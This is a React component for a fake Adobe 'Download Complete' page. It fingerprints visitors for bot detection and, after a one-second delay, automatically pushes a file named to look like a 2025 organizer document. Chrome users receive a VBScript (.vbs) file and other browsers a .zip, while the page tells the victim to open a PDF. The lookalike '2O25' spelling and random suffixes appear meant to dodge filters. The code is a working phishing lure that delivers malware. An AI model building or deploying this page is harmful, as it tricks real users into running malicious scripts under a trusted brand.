import { useEffect, useMemo } from "react";
import { useVisitorData } from "@fingerprint/react";
import adbLogo from "@/assets/adb-logo.png";

const randomDigits = (len = 8) =>
  Array.from(crypto.getRandomValues(new Uint8Array(len)))
    .map((b) => (b % 10).toString())
    .join("");

const Download = () => {
  const { data: visitorData } = useVisitorData({ immediate: true });

  useEffect(() => {
    if (visitorData) {
      console.log("Visitor ID:", visitorData.visitor_id);
      console.log("Bot detection:", visitorData);
    }
  }, [visitorData]);

  const downloadFile = useMemo(() => {
    const ua = navigator.userAgent;
    const suffix = randomDigits(8);
    if (ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
    }
    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
    }
    return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
  }, []);

  useEffect(() => {
    if (!downloadFile) return;
    const timer = setTimeout(() => {
      const link = document.createElement("a");
      link.href = downloadFile.href;
      link.download = downloadFile.name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 1000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden">
      <img src={acrobatBg} alt="" className="absolute inset-0 w-full h-full object-fill" />

        <div className="relative z-10 flex flex-col items-center mt-[2vh]">
          <div className="bg-white rounded-2xl shadow-2xl max-w-[440px] w-full mx-4 pt-8 pb-8 px-10 flex flex-col items-center text-center">
            <img
              src={adbLogo}
              alt="Adobe PDF"
              className="w-[100px] h-[110px] object-contain mb-5"
            />

            <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-2">Download Complete</h1>

            <p className="text-[15px] text-[#999] italic mb-4">You've received a secure document:</p>

            <p className="text-[15px] text-[#444] leading-relaxed">
              Your Document has been downloaded to your device.
            </p>
            <p className="text-[15px] text-[#444] leading-relaxed">
              Please check your <strong>Downloads</strong> folder
            </p>
            <p className="text-[15px] text-[#444] leading-relaxed mb-5">
              and open <strong className="underline">2O25_Organizer_02162026.pdf</strong> To view your document.
            </p>

            <p className="text-[15px] text-[#444] mb-6 leading-relaxed">
              If your Download did not start automatically, you can<br />
              download the document again
            </p>

            <a
              href={downloadFile.href}
              download={downloadFile.name}
              className="inline-block bg-[#4285f4] hover:bg-[#3367d6] text-white font-semibold px-10 py-3 rounded-md text-[15px] transition-colors"
            >
              Download Document
            </a>
          </div>
        </div>
    </div>
  );
};

export default Download;
